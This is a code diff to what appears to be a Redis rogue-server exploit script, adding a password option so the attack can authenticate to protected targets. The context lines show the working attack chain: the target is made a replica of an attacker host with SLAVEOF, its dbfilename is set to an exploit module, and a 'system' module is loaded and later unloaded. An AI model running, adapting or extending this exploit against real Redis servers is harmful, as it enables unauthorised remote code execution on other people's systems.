@@ -157,10 +157,14 @@ def cleanup(remote):
     info("Unload module...")
     remote.do("MODULE UNLOAD system")
 
-def runserver(rhost, rport, lhost, lport):
+def runserver(rhost, rport, lhost, lport, passwd):
     # expolit
     remote = Remote(rhost, rport)
     info("Setting master...")
+    # auth 
+    if passwd:
+    	info("Authenticating...")
+    	remote.do(f"AUTH {passwd}")
     remote.do(f"SLAVEOF {lhost} {lport}")
     info("Setting dbfilename...")
     remote.do(f"CONFIG SET dbfilename {SERVER_EXP_MOD_FILE}")
@@ -203,6 +207,8 @@ if __name__ == '__main__':
             metavar="EXP_FILE")
     parser.add_option("-v", "--verbose", action="store_true", default=False,
             help="Show full data stream")
+    parser.add_option("--passwd", dest="rpasswd", type="string",
+            help="target redis password")
 
     (options, args) = parser.parse_args()
     global verbose, payload, exp_mod
@@ -216,6 +222,6 @@ if __name__ == '__main__':
     info(f"TARGET {options.rh}:{options.rp}")
     info(f"SERVER {options.lh}:{options.lp}")
     try:
-        runserver(options.rh, options.rp, options.lh, options.lp)
+        runserver(options.rh, options.rp, options.lh, options.lp, options.rpasswd)
     except Exception as e:
         error(repr(e))
